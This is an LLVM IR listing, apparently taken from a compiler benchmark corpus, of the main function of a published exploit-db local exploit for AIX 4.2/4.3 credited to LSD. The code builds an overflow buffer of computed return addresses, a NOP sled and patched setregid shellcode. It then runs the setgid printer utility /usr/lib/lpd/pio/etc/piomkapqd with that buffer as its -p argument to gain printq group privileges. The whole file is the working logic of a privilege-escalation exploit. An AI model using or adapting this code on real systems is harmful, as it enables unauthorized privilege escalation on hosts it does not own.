; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_21094.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_21094.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM sep 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [63 x i8] c"/usr/lib/lpd/pio/etc/piomkapqd for aix 4.2 4.3 PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"usage: %s 42|43|433\0A\00", align 1
@setregidcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"\D2\02\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"\E7\04\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\82\03\00", align 1
@PRINTQ_GID = common dso_local global i8 0, align 1
@ADRNUM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@.str.7 = private unnamed_addr constant [31 x i8] c"/usr/lib/lpd/pio/etc/piomkapqd\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"-p\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [20000 x i8], align 16
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [2 x i8*], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  switch i32 %27, label %40 [
    i32 42, label %28
    i32 43, label %32
    i32 433, label %36
  ]

28:                                               ; preds = %23
  %29 = load i8*, i8** @setregidcode, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 44
  %31 = call i32 @memcpy(i8* %30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  br label %42

32:                                               ; preds = %23
  %33 = load i8*, i8** @setregidcode, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 44
  %35 = call i32 @memcpy(i8* %34, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  br label %42

36:                                               ; preds = %23
  %37 = load i8*, i8** @setregidcode, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 44
  %39 = call i32 @memcpy(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  br label %42

40:                                               ; preds = %23
  %41 = call i32 @exit(i32 -1) #3
  unreachable

42:                                               ; preds = %36, %32, %28
  %43 = load i8, i8* @PRINTQ_GID, align 1
  %44 = load i8*, i8** @setregidcode, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 46
  store i8 %43, i8* %45, align 1
  store i32 0, i32* %12, align 4
  br label %46

46:                                               ; preds = %51, %42
  %47 = load i8**, i8*** %7, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i32 1
  store i8** %48, i8*** %7, align 8
  %49 = load i8*, i8** %47, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %58

51:                                               ; preds = %46
  %52 = load i8**, i8*** %7, align 8
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = add nsw i32 %54, 1
  %56 = load i32, i32* %12, align 4
  %57 = add nsw i32 %56, %55
  store i32 %57, i32* %12, align 4
  br label %46

58:                                               ; preds = %46
  %59 = load i8**, i8*** %7, align 8
  %60 = ptrtoint i8** %59 to i64
  %61 = load i32, i32* %12, align 4
  %62 = and i32 %61, -4
  %63 = sext i32 %62 to i64
  %64 = add i64 %60, %63
  %65 = sub i64 %64, 8000
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %67 = bitcast i8* %66 to i64*
  store i64 %65, i64* %67, align 1
  %68 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3000
  %69 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8* %68, i8** %69, align 16
  %70 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 1
  store i8* null, i8** %70, align 8
  %71 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  store i8* %71, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %72

72:                                               ; preds = %84, %58
  %73 = load i32, i32* %12, align 4
  %74 = load i32, i32* @ADRNUM, align 4
  %75 = icmp slt i32 %73, %74
  br i1 %75, label %76, label %87

76:                                               ; preds = %72
  %77 = load i32, i32* %12, align 4
  %78 = srem i32 %77, 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = load i8*, i8** %10, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %10, align 8
  store i8 %81, i8* %82, align 1
  br label %84

84:                                               ; preds = %76
  %85 = load i32, i32* %12, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %12, align 4
  br label %72

87:                                               ; preds = %72
  %88 = load i8*, i8** %10, align 8
  store i8 0, i8* %88, align 1
  %89 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3000
  store i8* %89, i8** %10, align 8
  %90 = load i8*, i8** %10, align 8
  %91 = call i32 @sprintf(i8* %90, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %92 = load i8*, i8** %10, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 4
  store i8* %93, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %94

94:                                               ; preds = %108, %87
  %95 = load i32, i32* %12, align 4
  %96 = load i32, i32* @NOPNUM, align 4
  %97 = icmp slt i32 %95, %96
  br i1 %97, label %98, label %111

98:                                               ; preds = %94
  %99 = load i32*, i32** @nop, align 8
  %100 = load i32, i32* %12, align 4
  %101 = srem i32 %100, 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %99, i64 %102
  %104 = load i32, i32* %103, align 4
  %105 = trunc i32 %104 to i8
  %106 = load i8*, i8** %10, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %10, align 8
  store i8 %105, i8* %106, align 1
  br label %108

108:                                              ; preds = %98
  %109 = load i32, i32* %12, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %12, align 4
  br label %94

111:                                              ; preds = %94
  store i32 0, i32* %12, align 4
  br label %112

112:                                              ; preds = %125, %111
  %113 = load i32, i32* %12, align 4
  %114 = load i8*, i8** @setregidcode, align 8
  %115 = call i32 @strlen(i8* %114)
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %128

117:                                              ; preds = %112
  %118 = load i8*, i8** @setregidcode, align 8
  %119 = load i32, i32* %12, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = load i8*, i8** %10, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %10, align 8
  store i8 %122, i8* %123, align 1
  br label %125

125:                                              ; preds = %117
  %126 = load i32, i32* %12, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %12, align 4
  br label %112

128:                                              ; preds = %112
  %129 = load i8*, i8** %10, align 8
  store i8 0, i8* %129, align 1
  %130 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  %131 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %132 = call i32 @execle(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %130, i32 0, i8** %131)
  %133 = load i32, i32* %4, align 4
  ret i32 %133
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
